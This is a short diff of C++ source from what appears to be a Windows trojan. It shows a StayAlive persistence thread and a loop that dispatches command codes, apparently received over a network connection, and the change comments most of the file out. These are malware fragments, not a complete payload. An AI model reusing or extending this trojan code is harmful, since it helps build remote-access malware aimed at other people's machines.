@@ -1,12 +1,12 @@
 #include "..\pch.h"
 
 #include "Application.hpp"
-#include "..\Network\TCPConnection.hpp"
+#include "..\Network.hpp"
 #include "Commands.hpp"
-#include "..\Tools.h"
+#include "..\Tools.hpp"
 #include "..\Debugger.h"
 #include "..\Constants.h"
-
+/*
 BOOL Application::startSavingThread()
 {
 	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&StayAlive), TROJAN_APP_NAME, 0, NULL))
@@ -76,9 +76,9 @@ VOID Application::run()
 			}
 
 			sstr << msg;
-			INT code = UNDEFINEDCMD;
+			INT code = static_cast<INT>(Command::UNDEFINEDCMD);
 			sstr >> code;
-			if (code == UNDEFINEDCMD)
+			if (code == static_cast<INT>(Command::UNDEFINEDCMD))
 			{
 				$E(TEXTH("Undefined cmd code(%d)\n"), code);
 
@@ -102,3 +102,4 @@ VOID Application::run()
 		ClearConsole();
 	}
 }
+*/
